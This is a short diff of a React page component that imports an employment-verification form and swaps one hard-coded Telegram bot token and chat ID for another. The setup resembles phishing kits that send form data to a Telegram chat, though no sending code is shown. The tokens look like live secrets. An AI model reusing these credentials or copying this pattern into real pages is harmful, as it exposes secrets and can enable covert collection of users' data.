@@ -3,8 +3,8 @@ import EmploymentVerification from "./EmploymentVerification";
 import Footer from "./footer";
 import Header from "./header";
 
-const TELEGRAM_BOT_TOKEN = "6923253185:AAEeCL3NG0iF4TGMR4V8Ib2kITqDiOJ7IKo";
-const CHAT_ID = "6639364559";
+const TELEGRAM_BOT_TOKEN = "7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c";
+const CHAT_ID = "7062736155";
 
 const Home = () => {
   useEffect(() => {
